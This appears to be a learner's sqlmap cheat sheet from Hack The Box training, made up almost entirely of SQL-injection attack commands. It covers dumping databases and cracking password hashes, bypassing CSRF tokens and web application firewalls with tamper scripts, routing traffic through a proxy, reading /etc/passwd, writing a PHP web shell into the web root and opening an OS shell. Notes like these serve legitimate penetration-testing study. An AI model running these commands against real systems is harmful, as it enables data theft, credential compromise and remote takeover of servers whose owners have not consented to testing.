
#####  Copy request as curl and paste to terminal

```shell-session
la1n23@htb[/htb]$ sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

replace curl with sqlmap or save request to file: 
```shell-session
la1n23@htb[/htb]$ sqlmap -r req.txt
```

##### Scan using parameters in cookies:
```
sqlmap -u 'http://94.237.50.99:43765/case3.php'  -H 'Cookie: id=*' --dump --batch
```

#### Tuning

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

prefix and suffix for the query below

```php
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);
```

```
--batch --dump show response of queries

-T flag5 - specify table

--level 1 (1-5)

--risk 1 (1-3)

--code 200 match http code

--titles <title> match page title

--string=success match response string

--text-only strip all tags, keep only text of response

--technique=BEU - SQLi types (boolean, union, etc.)

specify number of colons for union based technique:

--union-cols=5
```

#### Enumeration
* `--banner`
* `--current-user`
* `--is-dba`
* `--tables`
* `-D dbname`
* `-C col1, col`
* `--where="name LIKE 'f%'"`
* `--dump-all --exclude-sysdbs` - enumerate all DBs
* `--schema`
* `--search -T table -C col1` -- search for table which contains word table
* `--passwords` - try to crack passwords

##### CSRF bypass
```shell
la1n23@htb[/htb]$ sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

##### Random value
```shell
la1n23@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
```

##### Parameters processing
```shell
la1n23@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
```

##### Proxy
`proxy="socks4://177.39.187.70:33283`
`--check-tor`
##### WAF
Whenever we run SQLMap, As part of the initial tests, SQLMap sends a predefined malicious looking payload using a non-existent parameter name (e.g. `?pfov=...`) to test for the existence of a WAF (Web Application Firewall). There will be a substantial change in the response compared to the original in case of any protection between the user and the target. For example, if one of the most popular WAF solutions (ModSecurity) is implemented, there should be a `406 - Not Acceptable` response after such a request.
Detect WAF by signature: https://github.com/stamparm/identYwaf

##### Useragent

```
--random-agent
```

##### Tamper Scripts
Modyfing queries to bypass WAF.

`--tamper=between,randomcase`
`--list-tampers`

##### HTTP paramater pollution (HPP)

```
id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...
```

##### Files

```shell-session
--file-read "/etc/passwd"
```

```shell-session
--file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

#### Upload shell

```shell
--os-shell
```

